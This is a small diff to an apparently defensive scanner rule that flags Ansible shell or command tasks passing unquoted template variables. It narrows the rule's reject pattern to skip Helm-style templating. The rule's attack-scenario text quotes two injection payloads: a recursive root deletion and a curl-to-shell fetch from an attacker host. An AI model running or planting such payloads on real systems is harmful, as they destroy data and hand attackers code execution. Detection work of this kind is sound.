@@ -18,7 +18,7 @@
       "lang": "yaml",
       "confidence": "medium",
       "re": "(?im)^\\s*(?:-\\s+)?(?:ansible\\.builtin\\.)?(?:shell|command)\\s*:\\s*.*\\{\\{.*\\}\\}",
-      "reject_re": "\\|\\s*quote\\b"
+      "reject_re": "\\|\\s*quote\\b|(?i)\\.values|\\binclude\\b|\\{\\{-|\\btpl\\b|toyaml|printf|common\\."
     }
   ],
   "attack_scenario": "a variable sourced from extra-vars, a survey field, hostvars, or a downloaded manifest contains a value like `; rm -rf / #` or `$(curl attacker|sh)`, and because it is not passed through the quote filter the injected shell metacharacters execute as root on every target",
